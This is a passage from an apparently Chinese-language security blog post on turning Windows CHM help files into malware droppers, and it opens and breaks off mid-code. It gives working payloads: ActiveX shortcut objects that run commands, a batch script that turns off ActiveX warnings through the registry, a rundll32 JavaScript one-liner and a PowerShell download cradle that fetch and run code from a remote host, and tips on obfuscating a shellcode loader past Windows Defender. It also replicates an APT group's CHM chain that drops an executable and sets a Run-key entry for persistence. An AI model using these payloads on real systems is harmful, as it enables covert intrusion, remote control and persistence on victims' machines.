class="attr">height</span>=<span class="string">1</span>&gt;</span>&#x27; + &#x27;<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span>&#x27; + &#x27;<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span>&#x27; + &#x27;<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,hh, -decompile C:\\Windows\\Temp\\Downloads\\ &#x27; + dir + &#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">AUTO</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,C:\\Windows\\Temp\\Downloads\\Test7Z1.exe&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.getElementById(&#x27;t0&#x27;).innerHTML = commodStr;  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">unrar.Click();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">isHasFile();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ActiveXObject"><a href="#ActiveXObject" class="headerlink" title="ActiveXObject"></a>ActiveXObject</h2><p>缺点，会提示是否运行ActiveXObject运行警告，但是可以通过修改注册表去关闭警告。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/vbscript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Function</span> <span class="title function_">test</span>()</span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Dim</span> oShell</span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Set</span> oShell = <span class="title class_">CreateObject</span>(<span class="string">&quot;WSCript.shell&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">	oShell.<span class="property">run</span> <span class="string">&quot;cmd /c calc&quot;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Set</span> oShell = <span class="title class_">Nothing</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">End</span> <span class="title class_">Function</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">test</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="注册表关闭ActiveXObject提示的Bat脚本"><a href="#注册表关闭ActiveXObject提示的Bat脚本" class="headerlink" title="注册表关闭ActiveXObject提示的Bat脚本"></a>注册表关闭ActiveXObject提示的Bat脚本</h3><p>执行该bat脚本将会关闭文件包含<code>ActiveXObject</code>脚本的警告。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="keyword">off</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cls</span></span><br><span class="line">set bl=<span class="number">0</span></span><br><span class="line">:setreg</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%bl%&quot;</span>==<span class="string">&quot;5&quot;</span> <span class="keyword">goto</span> ex</span><br><span class="line"></span><br><span class="line">set regpath=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\%bl%</span><br><span class="line"><span class="keyword">cls</span></span><br><span class="line"></span><br><span class="line">@reg add <span class="string">&quot;%regpath%&quot;</span> /v <span class="string">&quot;1201&quot;</span> /d <span class="string">&quot;0&quot;</span> /t REG_DWORD /f</span><br><span class="line"></span><br><span class="line">set /a bl=%bl%+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">:ex</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<h1 id="0x04-工具利用"><a href="#0x04-工具利用" class="headerlink" title="0x04 工具利用"></a>0x04 工具利用</h1><h2 id="NISHANG-Out-CHM"><a href="#NISHANG-Out-CHM" class="headerlink" title="NISHANG Out-CHM"></a>NISHANG Out-CHM</h2><p>仓库地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1</a></p>
<p>CS或者MSF开启托管powershell恶意脚本。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Out-CHM</span>.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Out-CHM</span> <span class="literal">-PayloadURL</span> http://xx.xx.xx.xx/ <span class="literal">-HHCPath</span> <span class="string">&quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span></span><br></pre></td></tr></table></figure>

<p>会在当前文件夹下生成<code>doc.chm</code>文件，执行后能正常上线，但是有黑窗弹出，客户端有察觉，不太合适。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:30:10-_hHOWqf_CHMFile_2_hHOWqf_1642066210880_hHOWqf_CHMFile_2.png" alt="20220113-17:30:10-_hHOWqf_CHMFile_2_hHOWqf_1642066210880_hHOWqf_CHMFile_2"></p>
<h2 id="MyJSRat"><a href="#MyJSRat" class="headerlink" title="MyJSRat"></a>MyJSRat</h2><p>该方式利用的是<code>rundll32</code> 加载恶意javascript脚本来实现的连接，可以实现不弹黑窗上线CS，客户端全程无异常。</p>
<p>仓库地址：<a target="_blank" rel="noopener" href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a></p>
<p>利用方式很简单</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 MyJsrat.py -i &lt;LHOST&gt; -p &lt;LPORT&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220113-17:30:28-_NSU9Jf_CHMFile_3_NSU9Jf_1642066228239_NSU9Jf_CHMFile_3.png" alt="20220113-17:30:28-_NSU9Jf_CHMFile_3_NSU9Jf_1642066228239_NSU9Jf_CHMFile_3"></p>
<p>访问<code>http://IP:PORT/wtf</code>获取受害机连接命令</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.<span class="keyword">write</span>();h=new%<span class="number">20</span>ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.<span class="keyword">Open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://172.16.1.86:1234/connect&quot;</span>,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%<span class="number">20</span>ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).<span class="keyword">Run</span>(<span class="string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,<span class="number">0</span>,true);&#125;</span><br></pre></td></tr></table></figure>

<p>将命令写入CHM的html文件中</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;calc poc&lt;/title&gt;</span><br><span class="line">		&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	command exec</span><br><span class="line">	&lt;OBJECT id=x classid=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="keyword">width</span>=<span class="number">1</span> height=<span class="number">1</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Command&quot;</span> value=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Button&quot;</span> value=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item1&quot;</span> value=<span class="comment">&#x27;,rundll32.exe,javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://172.16.1.86:1234/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;&gt;</span></span><br><span class="line">	&lt;PARAM <span class="keyword">name</span>=<span class="string">&quot;Item2&quot;</span> value=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="line">	&lt;/OBJECT&gt;</span><br><span class="line">	&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220113-17:30:41-_BmKKC0_CHMFile_4_BmKKC0_1642066241452_BmKKC0_CHMFile_4.png" alt="20220113-17:30:41-_BmKKC0_CHMFile_4_BmKKC0_1642066241452_BmKKC0_CHMFile_4"></p>
<p>使用CS托管powershell恶意脚本。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://HOST:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>因为有特殊字符，所以要对执行的命令进行base64编码。将双引号包裹的powershell代码内容复制到txt中。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:30:50-_VXNiKh_CHMFile_5_VXNiKh_1642066250169_VXNiKh_CHMFile_5.png" alt="20220113-17:30:50-_VXNiKh_CHMFile_5_VXNiKh_1642066250169_VXNiKh_CHMFile_5"></p>
<p>使用命令进行编码</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="number">2</span>.txt|iconv --<span class="keyword">to</span>-code UTF-<span class="number">16</span>LE |base64</span><br><span class="line"></span><br><span class="line"># 要执行的powershell命令如下</span><br><span class="line">powershell.exe -ep bypass -enc &lt;base64编码内容&gt;</span><br></pre></td></tr></table></figure>

<p>使用MyJSRAT执行反弹shell的powershell命令，使受害机器上线。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 MyJSRat.py -i <span class="number">172.16</span>.<span class="number">1.86</span> -p <span class="number">1234</span> -c <span class="string">&quot;powershell.exe -ep bypass -enc &lt;base64编码内容&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>开启MyJSRAT服务端后，只要打开CHM文件，客户端全程无弹窗上线CS。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:27:50-_iHt0rU_CHM-MyJSRAT_iHt0rU_1642066070926_iHt0rU_CHM-MyJSRAT.gif" alt="20220113-17:27:50-_iHt0rU_CHM-MyJSRAT_iHt0rU_1642066070926_iHt0rU_CHM-MyJSRAT"></p>
<h2 id="DotNetToJScript"><a href="#DotNetToJScript" class="headerlink" title="DotNetToJScript"></a>DotNetToJScript</h2><p>仓库地址：<a target="_blank" rel="noopener" href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p>
<p>其实也是和MyJSRAT方法一样，通过rundll32.exe加载ActiveXObject Javascript脚本区别在于DotNetToJScript利用Javascript代码反序列加载Net程序（其实都会用到ActiveXObject），Net程序这里我们就可以发挥自己的聪明才智，随便写点想写的东西都行。仓库的测试TestClass是弹一个消息窗口。这里我写了一个C Sharp的<code>Shellcode Loader</code>，这里我复用了默认的入口函数。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:31:10-_gt2kjS_CHMFile_6_gt2kjS_1642066270004_gt2kjS_CHMFile_6.png" alt="20220113-17:31:10-_gt2kjS_CHMFile_6_gt2kjS_1642066270004_gt2kjS_CHMFile_6"></p>
<p>使用DotNetToJScript生成Javascript脚本，除了Javascript脚本外，还能生成vbs、vba脚本。但是估计都被厂商杀烂了把。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe <span class="literal">-v</span> v2 <span class="literal">-o</span> test1.js ExampleAssembly.dll</span><br></pre></td></tr></table></figure>

<p>这里生成之后可以手动运行JS文件，看是否能正常上线，能正常上线就说明成功。</p>
<p>我这里是把生成后的javascript代码，嵌入了CHM文件的html源码中，缺点是打开后需要快速迁移进程。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:28:21-_7xPsaP_images-blog_2022-01-08_at_4_7xPsaP_1642066101345_7xPsaP_images-blog_2022-01-08_at_4.gif" alt="20220113-17:28:21-_7xPsaP_images-blog_2022-01-08_at_4_7xPsaP_1642066101345_7xPsaP_images-blog_2022-01-08_at_4"></p>
<p>混淆一下Javascript代码，效果不错，使用CS 4.3默认Profile都能过Windows Defender（前提是不<code>sleep 1</code>）。所以我猜测如果修改CS Profile，用https监听+自签证书搞不好能无压力过了。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:31:30-_cjldIq_CHMFile_7_cjldIq_1642066290161_cjldIq_CHMFile_7.png" alt="20220113-17:31:30-_cjldIq_CHMFile_7_cjldIq_1642066290161_cjldIq_CHMFile_7"></p>
<h1 id="0x05-“蔓灵花”组织CHM利用方法复现"><a href="#0x05-“蔓灵花”组织CHM利用方法复现" class="headerlink" title="0x05 “蔓灵花”组织CHM利用方法复现"></a>0x05 “蔓灵花”组织CHM利用方法复现</h1><p>分析报告地址：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NLe4JqmjiB58IQ5Kn6DSLQ">https://mp.weixin.qq.com/s/NLe4JqmjiB58IQ5Kn6DSLQ</a></p>
<p>这里仅复现报告中CHM文件的执行流程，CHM执行流程如图所示。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-17:31:45-_hruriY_CHMFile_8_hruriY_1642066305551_hruriY_CHMFile_8.png" alt="20220113-17:31:45-_hruriY_CHMFile_8_hruriY_1642066305551_hruriY_CHMFile_8"></p>
<p>演示用的二进制程序为自己编写的net程序，通过带外dns，发送主机名&#x2F;用户名、IP信息。</p>
<p><img src="https://images.atsud0.me/images/post/20220113-16:49:14-_LszqMG_images-blog%202022-01-13%20at%204_LszqMG_1642063754231_LszqMG_images-blog%202022-01-13%20at%204.gif" alt="https://images.atsud0.me/images/post/20220113-16:49:14-_LszqMG_images-blog%202022-01-13%20at%204_LszqMG_1642063754231_LszqMG_images-blog%202022-01-13%20at%204.gif"></p>
<p>完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;position:absolute; top:0px;left:0px; width:100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://images.atsud0.me/images/background.jpg&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">bgsound</span> <span class="attr">src</span>=<span class="string">&quot;ntest.exe&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set fso=CreateObject(&quot;&quot;Scripting.FileSystemobject&quot;&quot;):appdata=(CreateObject(&quot;&quot;Wscript.Shell&quot;&quot;)).ExpandEnvironmentstrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:Set fc=fso.GetFolder(fso.GetSpecialFolder(2)).files:For Each f1 in fc:If f1.size=7168 then : fso.CopyFile f1, appdata:Exit For:End If:Next:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">y</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set wss=CreateObject(&quot;&quot;WScript.Shell&quot;&quot;):path=wss.ExpandEnvironmentStrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:wss.RegWrite &quot;&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ctfmonitor&quot;&quot;, path,&quot;&quot;REG_SZ&quot;&quot;:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">z</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set sfso=CreateObject(&quot;&quot;Scripting.FileSystemobject&quot;&quot;):Set wsc=CreateObject(&quot;&quot;WScript.Shell&quot;&quot;):peaddr=wsc.ExpandEnvironmentstrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:Set QQ=createobject(&quot;&quot;Shell.Application&quot;&quot;):For i=1 to 1000:If sfso.fileexists(peaddr) then:QQ.ShellExecute peaddr:Exit For:End If:document.write():Next:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span>x.Click();y.Click();z.Click();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>设置内嵌的<code>ntest.exe</code>为背景音乐，按钮x主要通过rundll32.exe调用RunHTMLApplication，遍历内嵌文件中的文件大小为7168kb的文件，将其释放到%APPDATA%目录下，并重命名为ctfmon.exe。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bgsound</span> <span class="attr">src</span>=<span class="string">&quot;ntest.exe&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set fso=CreateObject(&quot;&quot;Scripting.FileSystemobject&quot;&quot;):appdata=(CreateObject(&quot;&quot;Wscript.Shell&quot;&quot;)).ExpandEnvironmentstrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:Set fc=fso.GetFolder(fso.GetSpecialFolder(2)).files:For Each f1 in fc:If f1.size=7168 then : fso.CopyFile f1, appdata:Exit For:End If:Next:window.close()&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>按钮y，将ctfmon.exe文件写入注册表开机启动项中。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">y</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe,vbscript:<span class="symbol">&amp;quot;</span>\..\mshtml,,,RunHTMLApplication <span class="symbol">&amp;quot;</span>&lt;br&gt;execute(&quot;Set wss=CreateObject(&quot;&quot;WScript.Shell&quot;&quot;):path=wss.ExpandEnvironmentStrings(&quot;&quot;%APPDATA%&quot;&quot;)&amp;&quot;&quot;\ctfmon.exe&quot;&quot;:wss.RegWrite &quot;&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ctfmonitor&quot;&quot;, 